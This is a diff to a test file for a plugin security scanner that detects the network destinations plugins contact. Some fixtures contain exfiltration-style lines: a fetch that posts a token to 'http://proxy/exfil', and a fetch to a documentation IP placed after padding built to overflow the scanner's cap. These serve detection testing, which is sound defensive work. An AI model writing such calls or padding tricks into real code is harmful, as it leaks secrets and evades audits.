@@ -1,6 +1,6 @@
 import { describe, expect, it } from 'vitest'
 import { auditPlugin } from '../../src/core/audit.ts'
-import { scanShape, shapeRedLines } from '../../src/core/shape.ts'
+import { MAX_DESTINATIONS, scanShape, shapeRedLines } from '../../src/core/shape.ts'
 import { scoreTrust } from '../../src/core/score.ts'
 import type { PluginInput } from '../../src/core/types.ts'
 
@@ -73,12 +73,55 @@ describe('scanShape', () => {
         'new URL(request.url ?? "", "http://local")',
         'fetch("https://dav.example/x")',
         'citations:["https://..."]',
-        '/* https://host/app/ and https://proxy/https://github.com/o/r.git */',
       ].join('\n'),
     }))
     expect(destinations.some(d => d.value === 'local' || d.value.includes('example'))).toBe(false)
     expect(destinations.some(d => d.value === '...' || /^\.+$/.test(d.value))).toBe(false)
-    expect(destinations.some(d => d.value === 'host' || d.value === 'proxy')).toBe(false)
+  })
+
+  it('does not read an XML namespace identifier as a plaintext request', () => {
+    const { destinations } = scanShape(input({
+      'a.js': [
+        'const svg = { xmlns: "http://www.w3.org/2000/svg" }',
+        'out += \'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\'',
+      ].join('\n'),
+    }))
+    expect(destinations).toEqual([])
+    expect(shapeRedLines(['network'], destinations)).toEqual([])
+  })
+
+  it('drops doc-block example URLs, which bundlers keep in shipped output', () => {
+    const { destinations } = scanShape(input({
+      'a.js': [
+        '/**',
+        ' * Behind a reverse proxy (`https://host/app/my-dsh/`) requests went to',
+        ' * `https://proxy/https://github.com/o/r.git` instead.',
+        ' */',
+        'export const base = document.baseURI',
+      ].join('\n'),
+    }))
+    expect(destinations).toEqual([])
+  })
+
+  it('still reports a single-label host used for a real request', () => {
+    const { destinations } = scanShape(input({
+      'a.js': 'fetch("http://proxy/exfil", { body: token })',
+    }))
+    expect(destinations.some(d => d.kind === 'http-host' && d.value === 'proxy')).toBe(true)
+    expect(shapeRedLines(['network'], destinations)).toContain('uses plaintext http:// to proxy')
+  })
+
+  it('keeps the riskiest destinations when padding overflows the cap', () => {
+    const padding = Array.from(
+      { length: MAX_DESTINATIONS + 5 },
+      (_, i) => `const u${i} = "https://cdn${i}.github.io/x"`,
+    )
+    const { destinations } = scanShape(input({
+      'a.js': [...padding, 'fetch("http://198.51.100.7/exfil")'].join('\n'),
+    }))
+    expect(destinations).toHaveLength(MAX_DESTINATIONS)
+    expect(destinations.some(d => d.value === '198.51.100.7')).toBe(true)
+    expect(shapeRedLines(['network'], destinations).length).toBeGreaterThan(0)
   })
 
   it('records filesystem absolute paths as path escapes, not destinations', () => {
